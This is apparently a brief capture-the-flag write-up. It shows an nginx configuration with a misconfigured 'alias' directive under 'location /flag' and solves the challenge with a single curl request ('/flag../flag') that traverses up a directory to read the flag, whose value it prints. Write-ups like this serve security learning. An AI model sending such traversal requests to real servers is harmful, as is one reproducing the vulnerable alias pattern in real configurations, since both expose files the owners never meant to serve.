# chal5

## Description

This time we are given a basic `nginx.conf` file.

```
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
daemon off;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	# server_tokens off;

	ssl_prefer_server_ciphers on;
	access_log /dev/null;
	error_log /error.log;
	gzip on;

	server {
	       listen 8081;


	       root /nginx;
	       index index.html;

	       location /flag {
			alias /nginx/;
	       }
	}
}
```

## Analysis

There's not a lot going on in the configuration. The only interesting part is the `alias` directive which turns out to be [quite quirky](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/).

## Solution

We can read the flag by navigating up a directory:

```
$ curl http://108.61.211.185:8081/flag../flag
junior-the_easy_way_up
```